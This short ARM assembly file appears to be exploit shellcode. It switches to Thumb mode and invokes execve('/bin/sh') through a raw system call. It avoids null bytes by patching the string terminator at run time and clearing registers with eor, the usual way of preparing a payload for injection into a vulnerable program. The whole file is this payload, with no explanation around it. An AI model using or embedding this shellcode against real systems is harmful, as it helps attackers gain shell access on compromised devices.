.section .text
.global _start

_start:
    .code 32

    // Switching to THUMB mode
    add r3, pc, #1
    bx r3

    .code 16

    // execve("/bin/sh", NULL, NULL)
    adr r0, binsh
    eor r1, r1, r1
    eor r2, r2, r2
    strb r2, [r0, #7]

    mov r7, #11 // SYS_execve
    swi #1

    binsh:
    .ascii "/bin/shx"
